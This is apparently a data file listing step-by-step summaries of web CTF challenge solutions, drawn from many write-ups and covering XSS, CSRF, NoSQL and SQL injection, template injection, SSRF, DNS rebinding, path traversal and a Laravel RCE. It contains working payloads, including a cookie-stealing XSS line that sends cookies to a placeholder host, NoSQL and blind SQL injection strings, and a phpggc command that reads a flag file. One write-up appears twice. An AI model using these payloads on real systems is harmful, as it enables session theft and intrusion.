    "Note that the page wasn't setting any X-XSS-Protection header so the XSS-Auditor in Chrome 74 is set to mode=filter meaning any reflected XSS will be filtered and not executed",
    "Append the xss=<script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\"> parameter to the query so the sha512.js script will be filtered and the DOMValidator.js will crash, resulting in <script>alert('pwned')</script> being executed",
    "Send this crafted URL to the admin to get the flag",
    "The website interface allows for creating redirect URLs, changing the admin's password, and reporting URLs.",
    "The website isn't protected by CSRF tokens but employs SameSite=Lax cookies. Hence there can't be any POST requests across different origins.",
    "The challenge is to change the admin's password, which surprisingly can be passed as a URL parameter.",
    "An insight into the problematic code in the /redirect shows a potential for XSS injection but this is blocked by the Content-Security-Policy header.",
    "We notice that the anchor element allows for a 'ping' attribute. This creates an opportunity since 'ping' sends a POST request when the link is clicked.",
    "To exploit this, we insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "The payload we insert is a URL, caused by clicking on it, generates a password change request for the admin account with a new password.",
    "Finally, we log in using the newly changed credentials pertaining to the admin account and retrieve the flag.",
    "Interpreted a template string in Python's format function with request.args as the argument",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Discovered that the goal was to read the 'app.secret_key' value",
    "Ran the server locally",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Found the chain of properties that led to the Flask.app object",
    "Used the found object to access the 'app.secret_key' value in the 'Flask.current_app' module",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Executed the Python script to solve the challenge using the command: python3 -m flask run",
    "Requested multiple 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Used Python-random-module-cracker tool to predict the next 'nonces'",
    "Created a paste with multiple script tags each having different nonce",
    "Expected that one of the nonces will work when the admin visits the page",
    "Obtained the admin's cookie to retrieve the flag",
    "Identify that the task is similar to the previous one but requires blind NoSQL injection",
    "Understand that the goal is to fetch all of the password's characters",
    "Begin by using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}} which returns 'true'",
    "Then try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}, which returns 'false'",
    "From this, infer that fetching passwords is possible by comparing password characters to the alphabet in the payload",
    "Perform a bruteforce attack by comparing all characters in a possible range",
    "Find that the password is 'congratsyouwin' via the bruteforcing method",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}",
    "Identified the challenge as a NoSQL Injection task",
    "Used curl to send a POST request to the server's login endpoint",
    "Sent a JSON body containing 'username': 'admin' and 'password': {\"$gt\": \"a\"}, taking advantage of NoSQL's $gt (greater than) operator to bypass the password check",
    "Included a manipulated cookie in the request's header to bypass any session-based authentication",
    "Obtained an authenticated session cookie for 'admin' in return",
    "Navigated to the site's main page with the authenticated session",
    "Retrieved the CTF flag from the accessed page",
    "Study and inspect the provided instance of a simple website with functionality including a 'flag store', create new store, update created store description, and create items in created store.",
    "Look for potential vulnerabilities or points of entry, taking note of any suspect templates in the webpage's code, such as an 'update store description' template.",
    "Recognizing the problem to be potentially related to Server-side Template Injection, begin to test this theory with 'handlebars', which previously had a known vulnerability in processing templates.",
    "Assess the function of the 'handlebars' library within the system as it could present an entry point if a vulnerability, such as Template Injection, can be exploited successfully.",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability despite the past reported vulnerability being fixed.",
    "Identify a token structure that, if manipulated, could allow for unauthorized purchases from the 'flag store'.",
    "Find the mechanism through which the 'id' in the token is created (concatenating 'store_name' and 'item_name') and how the token is signed using 'store.key'.",
    "Understand the structure of the store object, noting if there are any properties that are not defined initially but used later.",
    "Locate where 'store.key' is defined using 'crypto.randomBytes' and when this function is called, and pay attention to what actions trigger the key's update.",
    "Devise a strategy that involves acquiring the secret key from the store object, to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Recognize the security checks in place, the most crucial one is in the 'checkout(req, res)' function that will verify the token's signature matches the key.",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key', even if you do not need to achieve Remote Code Execution (RCE).",
    "Attempt to access or replace 'store.key' through the Template Injection vulnerability, which may require redefining the Object prototype.",
    "Find a way around the lack of access to the constructor property by using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Apply the determined attack vector to exploit the system, overriding the prototype using a payload to set a context to the prototype of [object] and redefining 'key' through '__defineSetter__' and '__defineGetter__'.",
    "Once the injection payload has been executed, check that the accessor for 'key' has been overridden and behaves as expected, for instance by returning a '[object Object]' string and not allowing itself to be overridden by a new value.",
    "Create a token with the overridden '[object Object]' as the secret key and 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Automate the process through script and execute the exploit to retrieve the flag ('flag{npm_devs_are_pretty_bad_at_fixing_bugs}') and complete the CTF.",
    "Provided with a website with functionalities for login/register, edit profile, and support",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "The 'Edit profile' section lets users edit their own name",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section made the admin visit it and the 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Found out the parameter 'uuid' in the request 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>' is vulnerable to injections ( XSS/CSS ) and is limited to '36 characters'",
    "Discovered 'manage.php' page with dirbuster, this page is the admin's tool for changing 'user status' to 'premium'",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token', these tokens are associated with the current session",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php' with a 'Referrer' different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one' resulted in 'Wrong Referrer' error",
    "Attempt to change status to 'premium' resulted in 'Permission Denied!' message",
    "Decided to use CSRF (Cross-Origin Request Forgery) attack to change the status to 'premium', the only missing piece is the 'token'",
    "Created a payload `\"><svg/onload=$.globalEval(name)` with length of '32 bytes' where 'name' is a short form of 'window.name' property",
    "Assigned the payload by sending the admin to our webpage, where we triggered 'window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>)', setting 'window.name' to '<long payload>'",
    "Sent the admin to the page with the payload, and the flag was found the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Provided with a website with functionalities for login/register, edit profile, and support",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "The 'Edit profile' section lets users edit their own name",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section made the admin visit it and the 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Found out the parameter 'uuid' in the request 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>' is vulnerable to injections ( XSS/CSS ) and is limited to '36 characters'",
    "Discovered 'manage.php' page with dirbuster, this page is the admin's tool for changing 'user status' to 'premium'",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token', these tokens are associated with the current session",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php' with a 'Referrer' different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one' resulted in 'Wrong Referrer' error",
    "Attempt to change status to 'premium' resulted in 'Permission Denied!' message",
    "Decided to use CSRF (Cross-Origin Request Forgery) attack to change the status to 'premium', the only missing piece is the 'token'",
    "Created a payload `\"><svg/onload=$.globalEval(name)` with length of '32 bytes' where 'name' is a short form of 'window.name' property",
    "Assigned the payload by sending the admin to our webpage, where we triggered 'window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>)', setting 'window.name' to '<long payload>'",
    "Sent the admin to the page with the payload, and the flag was found the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Identify the provided file is a packet capture (.pcap) file.",
    "Use Wireshark to read the packet capture file.",
    "Search for HTTP packets within the packet logs.",
    "Locate the POST requests to '/login.php' and note the presence of 'username', 'cnonce', and 'hash' parameters.",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Identify the existence of a WebSocket tunnel from the 'HTTP/1.1 101 Switching Protocols' packet.",
    "Analyze the JavaScript bundle to understand how the hash is calculated. Identify needed parameters: username, nonce, and cnonce.",
    "Observe that the password is not given directly but might be related to the hash.",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Understand that the client-server communication uses an encoding function which involves two keys - 'key' and 'key2'.",
    "Note that client's 'User-Agent' value is used in the encoding function and this value can be fetched from HTTP headers.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Determine that 'key2' is a shuffled version of 'key'. This shuffle is based on seeded random values tied to the 'User-Agent'.",
    "Identify that an attacker has set up a keylogger which sends each pressed key to an external server as an encoded message.",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input) and unrelated ones such as 'pings'.",
    "Dump the related WebSocket packets for further analysis (decoding).",
    "Briefly analyze the encoding function to get the basic idea for decoding messages.",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58. Note that only 'encoded_arr[0]' is known, and 'seed' is the actual character of 'msg' that we are trying to find.",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'. Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Repeat the process for characters in each WebSocket packet.",
    "Remove unwanted characters from the decoded message and extract the final flag.",
    "Downloaded the src.zip file from the provided link",
    "Extracted the contents of the zip file which included bundle.js and index.html files",
    "The task was to find out the correct password in an input field on the provided webpage",
    "The JavaScript code responsible for password checking was obfuscated, making analysis more challenging",
    "Triggered a JavaScript debugger inside the web-browser's developer tools",
    "Observed the process of function calls within the JavaScript code",
    "Spotted a string within the JavaScript scope which represented the flag: _0x256968: 'HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}'",
    "Flag was successfully obtained: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Access the provided URL for the decryption service and note the UUID prefix '9e5a' mentioned in the challenge description",
    "Download the provided 'src.zip' file and 'flag.png.encrypted' file from the challenge description",
    "Unzip 'src.zip' and inspect its contents, focusing on the 'decrypt.php' file which suggests the potential for an SQL injection via the UUID POST data",
    "Further inspect 'functions.php' file revealing a function that validates the input of a UUID. Understand that the input format for the SQL injection should match the UUID format",
    "With the knowledge of the correct UUID format and a prefix, construct an SQL injection query that follows the format and includes a statement to match the initial UUID sequence, resulting in a restructuring to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'",
    "Use this input string to perform the SQL injection and decrypt the 'flag.png.encrypted' file",
    "Retrieve the flag from the decrypted image",
    "Identified a heavily filtered error-based blind sql injection",
    "Created an SQL payload to get the length of the flag by trying out different lengths in place of '$LENGTH$'",
    "Found out that length of the flag is 38 characters",
    "Double hexed the flag to obtain a 152-digit long number that only consisted of digits",
    "Discovered that passing integers larger than 9223372036854775807 will get them cast into floating numbers",
    "Leverage the property of SQLite that it can concatenate large integers as they were strings, such as '9223372036854775807||9223372036854775807' to give '92233720368547758079223372036854775807'",
    "Iterated over all composited 152-digit long '$NUMBER$' using the 'max(A, B)' SQL function which returns the larger one",
    "Assembled the identified parts of the double hexed flag to get the final flag: 343836313732363536423631374136353433353434363742333433313644354633373330354636323333354633343546333537313643333133373333354636443334333533373333373237430 which is 'HarekazeCTF{41m_70_b3_4_5ql173_m4573r|'",
    "Noticed that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "The code must contain only lowercase letters, parentheses and periods",
    "Created a payload using functions that when run, return 1337",
    "Used factorization of 1337 which is 7*191 to create the first payload",
    "Reduced the number of characters in the payload by improving upon the first solution",
    "Further reduced the payload character count by poking around and using different functions",
    "Used a new approach not involving factorization to achieve a payload with an even smaller character size",
    "Improved payload further by using different JavaScript functions to reduce the character count",
    "Met the condition in the JavaScript code by running a payload such that it equals 1337",
    "The code gave the flag upon meeting the condition",
    "Visited: https://yeunote.ctf.yeuchimse.com/ and assessed the functionality of the web page.",
    "Checked for a possibility of XSS injection in the CSRF token script.",
    "Checked the site's 'Bug Bounty' form which sends suspicious URLs to be visited by a headless Chrome agent.",
    "Attempted to utilize CSRF mechanism to gain admin access.",
    "Created a CSRF page that attempts to add the attacker's email to the admin's shared note.",
    "Used <meta name='referrer' content='no-referrer'> to bypass the restriction caused by the referrer header.",
    "Overwrote document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Constructed a post form to add the attacker's email (my_email@foo.com) to the admin's shared list.",
    "Managed to access the admin's note but faced a password prompt.",
    "Noticed that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Tried to implement a similar mechanism to the CSRF mechanism used earlier to grab the password.",
    "Attempted to log in the admin to a dummy Twitter account and share the password.",
    "Noticed an undeleted Tweet that contains the password by another user.",
    "Tried different versions of the Twitter login page to authenticate on behalf of the admin without success.",
    "Tried to generate 'oauth tokens' for the flag note in order to share the generated URL with the admin.",
    "Found out it is achievable by making two additional GET requests: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3' and 'GET https://yeunote.ctf.yeuchimse.com/note/twitter?oauth_token=<oauth token>&oauth_verifier=<oauth verifier>'.",
    "Intercepted 'oauth tokens' by stopping the request from 'twitter' to 'yeunote' before it gets executed using burp tool.",
    "Accessed URL http://138.68.228.12/?is_debug=1 obtained from source code to get index.php source code",
    "Identified task to bypass countermeasures to gain full control of the $whoareyou variable",
    "Realized necessity to create raw HTTP requests to hijack the $whoareyou variable",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'",
    "Identified manipulating capabilities of Apache2 which allows directory switching",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request, causing Apache2 to crash due to ':' in directory name",
    "Managed to by-pass the 'strpos(urldecode($remote),'..')' and 'parse_url($remote, PHP_URL_HOST)' conditions",
    "Managed to control $whoareyou variable and passed through conditions checking for specific value comparisons",
    "Used a bash script to extract the PHPSESSID with auth set",
    "Received form on alien_sector.php after having right PHPSESSID in cookies",
    "Abused the type attribute and sent the request 'type=/../super_secret_shell.php'",
    "Created a reverse shell script using only non-alpha chars to bypass message length restriction",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'",
    "Received the flag: MeePwnCTF{__133-221-333-123-111___}",
    "Found alternative solution posted by P4Team, which used distinct virtual hosts and shell wildcards for the same result",
    "Identified that the request was double proxied with Apache and Nginx.",
    "Discovered that Apache2 is very restrictive towards parsing the HTTP request.",
    "Noted that both Nginx and Apache block '/debug*'.",
    "Found information on Angular's secondary segments in paths.",
    "Investigated Angular's source code and discovered a 'primary' segment.",
    "Used the primary segment to create a URL that would circumvent the '/debug*' restriction.",
    "Visited the manipulated URL and retrieved the flag.",
    "Bypassed the Angular application that was set up behind Nginx reverse proxy.",
    "Accessed '/debug/answer' endpoint which was restricted both by nginx and the application.",
    "Used a trick where angular recognizes '\\' as '/', and %-decodes strings. Matched to 'debug/answer' via a simple curl request to '/\\%64ebug/answer'.",
    "Discovered another way to solve the challenge for the second flag by injecting '\\debug\\answer' as the host in a curl request.",
    "Confirmed that when Angular tries to match up the path, it parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Identified the challenge as one requiring bypass of an Angular application setup behind an Nginx reverse proxy",
    "Recognized two flags; one hidden in angular endpoint /debug/answer restricted by Nginx and application, and one hidden in express endpoint /api/true-answer accessible only from localhost (IP: 127.0.0.1)",
    "For the second flag, analyzed server-side JavaScript handling requests to '/api/true-answer', which only responded with the flag if the request came from the loopback network",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy, 'req.ip' always pointed to the same IP address of the reverse proxy",
    "Identified that the application didn't trust 'X-Forwarded-*' headers so the IP address couldn't be overridden",
    "Noticed when accessing '/q' endpoint, the application displayed contents of '/api/answer'. This was done server-side",
    "Understood 'this.service.getAnswer()' led to 'this.http.get('/api/answer')' as it's a part of Angular’s internal methods showing it was fetching '/api/answer' from server-side",
    "Found out Angular, while performing HTTP requests, uses a Host header - 'PROTOCOL + HOST + / PATH' - and also follows redirects",
    "Formulated a strategy to provide a custom host and redirect anything to '127.0.0.1/api/true-answer' for capturing the flag",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me' to bypass restrictions",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using, which abused strange behaviors of `<math>` elements.",
    "Used the provided bypass and attempted to mutate the element in order to bypass the sanitizer.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer and `<math>` element bypass.",
    "Identified a mutation with the `<table>` element that could be simplified to create the exploit.",
    "Created a payload to leak cookies to the server by utilizing the mutation found earlier.",
    "Identified that the challenge seemed to involve reCAPTCHA, indicating the previous solution may not have been intended and deciding to look for another way to solve the challenge.",
    "Realized the application was simulating a Brainf*ck decompiler, which had protection against `<` and `>` characters with a `replaceAll` function.",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running, which could lead to unreplaced `<` and `>` characters provided the function was not called.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Injected two `reCAPTCHA` buttons to manipulate the `statusCode`.",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Crafted a final payload that exploits the bypass and rewrites the document to `/terjanq/`.",
    "Identify that the goal of this CTF problem is to bypass WAF protection to access local resources",
    "Study the provided Python script and identify that the program attempts to validate IP addresses and checks if IP matches certain values to confirm its a valid non-private IP",
    "Note the condition within the 'admin_status' function that only returns the flag if the request is coming from a '127.0.0.1' IP address",
    "Recognize that the 'valid_ip' function restricts usage of 0, 10, 127, certain ranges of 172, 169, and 192 IPs which includes the localhost (127.0.0.1)",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation to bypass the restrictions set in the 'valid_ip' function",
    "Use the octal notation of 127.0.0.1 IP address which is 0177.0.0.1 to bypass the restrictions",
    "Make a HTTP request to 'http://0177.0.0.1/admin-status' from the localhost",
    "Observe the returned flag",
    "Identify the goal: Bypass a WAF (Web Application Firewall), with the IP address being checked using the ipaddress library in Python.",
    "Understand the provided code, which validates a given IP by first checking if it is a private IP using the ipaddress library. If the IP is not private (i.e., it's a global IP), the code proceeds to send a GET request to the provided url.",
    "Observe that the code is structured in such a way that it performs two DNS resolutions: the first to check if the destination is private, and the second to request the resource.",
    "Add two A records to the DNS entry in an attempt to bypass this double-check, by first resolving to 127.0.0.1 (a local IP) and then to 51.38.138.162 (an IP address of a server).",
    "Make several attempts with this setup until the flag is obtained.",
    "For a more reliable solution, consider setting up a personal DNS server: one that will temporarily respond with a public IP (when the Python program is checking), but then resolve to the local IP when the GET request is made.",
    "Because this method is similar to DNS Rebinding, consider using a tool such as singularity to set up this type of server.",
    "Demo the reliability of this solution by using the DEMO application provided by singularity, replacing the RANDOM placeholder in the URL with something random.",
    "Identified that input sanitization is only implemented on the front end via JavaScript.",
    "Decided to use burpsuite to bypass the front-end input sanitization.",
    "Configured and started the burpsuite tool to intercept data between the server and the client.",
    "Intercepted the data and manipulated it using burpsuite, thus bypassing the front end input sanitization.",
    "The hint for this challenge talks about being stuck in debug",
    "Some research shows there is a CVE for this, and the Laravel version were working with is vulnerable",
    "Identified the relevant exploit and supporting materials related to the CVE",
    "Find 'ip/_ignition/execute-solution' for a Laravel panel with error messages and stack trace",
    "Attempted performing a post request but it gave a 302 response",
    "Referred to GitHub exploit pages: 'https://github.com/ambionics/phpggc' and 'https://github.com/ambionics/laravel-exploits'",
    "Created a phar file with custom command from 'phpggc' repo",
    "Put the phar file into the exploit with specified URL to run the exploit",
    "Since we knew the flag was found in the root directory and its name, executed 'php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system \"cat /flagM1AhS\"'",
    "Ran the exploit with the phar file as './laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar'",
    "Obtained the flag: 'CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}'",
    "Visited the webpage and found a part of a flag: CHTB{",
    "Explored the file /static/js/main and found another part of flag: us3full_1nf0rm4tion}",
    "Looked into static/css/main.css and found a potential hint: c4n_r3ve4l_",
    "Additionally found in js.main the last piece of our flag:1nsp3ction_",
    "Combined all the collected parts to form the complete flag :`CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`",
    "Identified a hint in the website about changing language potentially involving code str_replace",
    "Recognized a possible chance to test Local File Inclusion (LFI) through 'ip.address/?lang=es.php'",
    "Identified that developers may have used blacklisting to prevent path traversal by replacing certain string patterns",
    "Inferred payload modification would be required to bypass these security measures by using repeated directory traversal sequences",
    "Executed the first successful exploit by plugging into the URL a modified payload with long sequence of directory traversal leading to '/etc/passwd'",
    "Found the flag by testing one more exploit with the modified payload leading to '/flag' instead of '/etc/passwd'",
    "Accessed the login page and source code of the web app",
    "Analyzed the 'entrypoint.sh' bash file and noted the MongoDB storage of a password with username 'admin'",
    "Aimed to extract the password serving as the flag",
    "Investigated potential for NoSQL injection due to use of MongoDB",
    "Intercepted the login request with 'Burpsuite' to inspect the response better",
    "Noted the Json response and message displayed on front end upon attempted logins",
    "Attempted basic payloads for NoSQL injection with unsuccessful results",
    "Attempted authentication bypass with advanced payloads",
    "Used RegEx payload to confirm presence of characters in the password",
    "Confirmed that the flag begins with 'CHTB{'",
    "Progressively brute-forced characters, checking successful log-in messages to determine correct characters",
    "Developed a Python script to automate the brute-forcing of characters",
    "Ran the script and obtained the complete flag",
    "Analyze the given files and find that it's a Python environment and the Python Pillow library is being used.",
    "Notice that a vulnerable version of the Python Pillow library is being used and find a related pull request on github to gain insights.",
    "Understand from the pull request that it's possible to trigger Server Side Request Forgery (SSRF).",
    "Find usage of 'eval' in util.py that is being used on data from POST request.",
    "Understand that it's possible to upload an image with RGB parameters.",
    "Experiment with uploading images and manipulating RGB values.",
    "Successfully read the flag.txt file by replacing one of the RGB values in the 'background' parameter.",
    "Export or send the content of flag.txt to a webhook.",
    "The challenge involved an application where the markdown input gets converted into a PDF file available for download",
    "The first step was examining the `package.json` file found in the site source",
    "In this file two dependencies 'md-to-pdf' and 'nunjucks' were identified as potentially interesting",
    "Research led to the discovery of a CVE for `md-to-pdf` and a payload that could potentially exploit this vulnerability",
    "The original payload did not work, leading to further research and discovery of a known issue in 'nunjucks' that it was having issues with single line payload",
    "It was discovered that the payload needed to be adjusted to work with `nunjucks`, this was done by making sure line 1 and 3 of the payload were written in a specific way",
    "The payload used was one that executed a command to find the flag and redirected it to a file in the invoices directory",
    "With this payload, the flag was successfully captured",
    "Arrived at a support page featuring a POST request capability and a login page",
    "Attempted a cookie stealing challenge by sending the payload <img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>",
    "Received a JWT session token in response",
    "Decoded the JWT token to reveal the 'username', 'uid', and 'iat'",
    "Discovered an API endpoint /api/users/update",
    "via XHR, sent a request to update the password",
    "Logged in with the new password",
    "Attempted to escalate privileges by changing the 'uid' from 100 to 1 using the previous payload",
    "Logged back in with escalated privileges",
    "Observed website which presented a login page with no additional information present or in the source code",
    "Checked the docker configuration file for additional information",
    "Determined that the website is a Flask application running on a MySQL database, suspected possible SQL Injection",
    "Discovered database information contained within the config.py file",
    "Review of the database.py file revealed a hint suggesting input was not sanitized",
    "Deduced that the database logic requires the token of the password for successful login",
    "Captured the login request to utilize in a SQL Injection attempt",
    "Used sqlmap on the saved login request to attempt to extract database details",
    "Successfully extracted the user and corresponding password token via SQL Injection",
    "Logged in using the extracted credentials to successfully obtain the flag from the challenge",
    "Provided with a URL and Docker file for the challenge.",
    "Accessed the website showing the status report of the combat robot and a command prompt to execute commands.",
    "Analyzed the Docker file.",
    "Discovered a hint suggesting that the 'shell_exec' function is running, which executes a command in a shell and returns the output.",
    "Identified that the 'shell_exec' function may be unsanitized, allowing for potential shell command exploits.",
    "Attempted to escape the 'shell_exec' function and run shell commands.",
    "Confirmed the exploit worked and was able to run shell commands.",
    "Used the exploit to read the flag.",
    "Checked the login page source code and docker files",
    "Realized application is running Flask with MySQL, similar to previous Drobots challenge",
    "Found database config info in config.py",
    "Looked into database.py and noticed password is getting verified with passwordVerify",
    "Saved the request and used sqlmap to brute force the password and obtain the token",
    "Logged in with the obtained credentials, noticed a change in website functionality",
    "Checked routes.py file which contains the application logic",
    "Identified missing file escape for characters on the filename from the logic",
    "Utilized path traversal to access /etc/passwd file",
    "Relocated flag name from 'flag.txt' to 'signal_sleuth_firmware' in root",
    "Extracted the flag",
    "Opened the app's login page and noticed an option to register a new account",
    "Checked the network tab and noticed a graphql endpoint",
    "Went to a third-party website to generate an introspection query for graphql which returns all the content of a graphql schema",
    "Copied the introspection query and pasted it into BurpSuite in order to send it to the graphql endpoint",
    "Received a full introspection response from the /graphql endpoint",
    "Pasted the introspection data received into the graphql voyager tool to visualize the data structure",
    "Identified a 'Mutation' query in the graphql schema which allows change of a user password",
    "Used the 'UpdatePassword' mutation to change the admin account's password",
    "Logged into the admin account with the new password",
    "Discovered the flag in the password of a note",
    "Opened the developer tools and checked the network tab to find a script.js",
    "Analyzed the script.js content which contained some code that checks for a 4 digit pin and fetches the flag, depending on the pin being equal to the value of “CONFIG.correctPin” or not",
    "Switched to the console to log the “CONFIG”, in order to see what comes back",
    "Typed the correct pin and pressed enter which returned the flag",
    "Here we have a service which lists all the items in the mentioned dir",
    "So i simply started looking for flag, look for elements in the /home dir",
    "Here we have a user dir and in that we have the flag.txt",
    "/home/user & cat /home/user/flag.txt",
    "Here we have the flag",
    "Change the server to the testing server",
    "Authorize using the admin:admin credentials",
    "Execute the request to get the flag",
    "Given a company website for the CTF challenge",
    "Noticed URL Capture and Admin buttons on the website",
    "Discovered that URL capture service takes a screenshot of a submitted webpage URL",
    "Found an admin login page",
    "Attempted to access localhost on the URL capture service and was successful",
    "Noticed the loading splash screen is identical to the challenge website",
    "Checked robots.txt and discovered a new path /server-status",
    "Attempted to access /server-status and was successful",
    "Found the login credentials in the logs",
    "Given a login page that does not contain any JavaScript code",
    "Found that a status 500 is received when an apostrophe is used in either the username or password field",
    "Further observed that an error does not occur if an apostrophe is used in both fields",
    "Tested an approach where the username field contained blank input enclosed in two apostrophes, and the password field contained a single apostrophe",
    "Noticed an error in the above case, indicating the presence of an unclosed apostrophe",
    "Used the same approach as above, but filled both the username and password fields with blank input enclosed by two apostrophes, and found that there was no error",
    "Confirmed the presence of blind SQL injection by using a payload of ' or sleep(2) and 1=1#",
    "Deducing it was MySQL due to the difference in syntax for other database systems",
    "Bruteforced the flag one character at a time using the SUBSTRING and SLEEP functions",
    "Explained the function syntax. SUBSTRING requires three arguments: the string to check, the position to check, and the length to check. Used the IF function which also needs three arguments: the condition, the action if true, and the action if false",
    "Automated the process using a Python script that sends a post request with the payload for every possible character in the flag. Whenever a correct character is found (indicated by a read timeout due to the 5 seconds delay), the character is appended to the flag and the script moves to the next character",
    "Check the cells and find a formula",
    "Identify that the formula points to another sheet's labeled 'Source' and a specific range 'A:B'",
    "Activate accessibility tools in the Tools section to unhide hidden sheets",
    "Using Accessibility Tool, call a range from the document",
    "Realize that a hidden sheet's full range can be accessed by just typing its name",
    "Reveal the hidden sheet which gets added to the panes",
    "Find the flag inside the hidden sheet",
    "Logged in using the credentials: admin:admin",
    "Navigated to the simple quiz section",
    "Found and retrieved the flag: flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}",
    "Logged in using the provided credentials.",
    "Found a cookie named userData with userID and username.",
    "Began analysing the server code files, specifically, app.js.",
    "Found out that the correct user id is needed for admin access, instead of the password.",
    "Fired up BurpSuite and sent the request with the cookie to the intruder.",
    "Replaced the username with 'admin' and set the payload parameter at userID.",
    "Set up a grep match for 'flag{' to find the starting of the flag.",
    "Searched for a checked checkbox for 'flag{' and found the flag in the response section of that response.",
    "Confirmed the flag on the website by changing the cookie values: userID to 768 and username to 'admin'.",
    "Retrieved the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "Accessed the target website's CSS source by entering 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "Investigate the site and its rules",
    "Try various inputs including special characters and note the responses",
    "Examine attached server.py file and understand the requirement for three keys",
    "Apply brainstorming and logic to explore using commas as input",
    "Investigate response on submitting a single comma as input",
    "Increase commas input to three since the requirement is for three keys",
    "Observe output hinting character set",
    "Utilize this character set in conjunction with three commas as to meet the requirement",
    "Submit and receive the flag",
    "We have a simple login page",
    "JSON body is sent to the server which contains username and password",
    "Unusual thing here is that the error is shown in a javascript alert",
    "The page source looked normal so I proceeded to intercept the login request with burpsuite",
    "If we remove the 'name' key value pair from JSON body we can see the following error",
    "This error reveals few things to us: python flask backend is used, the exceptions are showed in the alert pop up, 'name' key value pair are required",
    "After this I tried to remove the 'password' key",
